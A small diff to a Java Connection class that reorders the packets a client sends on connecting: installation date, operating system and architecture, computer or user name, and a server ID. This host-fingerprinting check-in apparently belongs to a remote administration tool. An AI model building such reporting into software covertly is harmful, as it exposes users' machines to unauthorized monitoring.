@@ -134,6 +134,8 @@ public class Connection implements Runnable {
 
 		addToSendQueue(new Packet31InitInstallationDate(Configuration.date));
 
+		addToSendQueue(new Packet16InitOperatingSystem(OperatingSystem.getShortOperatingSystem(), OperatingSystem.getLongOperatingSystem(), Arch.getStringFromArch()));
+		
 		String computerName;
 		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 			computerName = System.getenv("COMPUTERNAME");
@@ -141,8 +143,6 @@ public class Connection implements Runnable {
 			computerName = System.getProperty("user.name");
 		}
 		addToSendQueue(new Packet14InitComputerName(computerName));
-
-		addToSendQueue(new Packet16InitOperatingSystem(OperatingSystem.getShortOperatingSystem(), OperatingSystem.getLongOperatingSystem(), Arch.getStringFromArch()));
 
 		addToSendQueue(new Packet15InitServerID(Main.getID()));
 
